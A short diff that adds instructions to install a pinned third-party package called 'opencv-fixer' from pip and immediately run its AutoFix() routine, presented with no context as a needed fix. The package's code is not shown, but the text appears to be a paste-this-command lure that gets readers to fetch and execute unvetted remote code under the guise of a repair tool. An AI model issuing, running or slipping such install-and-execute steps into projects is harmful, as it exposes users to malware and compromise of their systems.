@@ -1,0 +1,5 @@
+need to run this:
+# 1. download the autofix tool
+pip install opencv-fixer==0.2.5
+# 2. execute
+python -c "from opencv_fixer import AutoFix; AutoFix()"
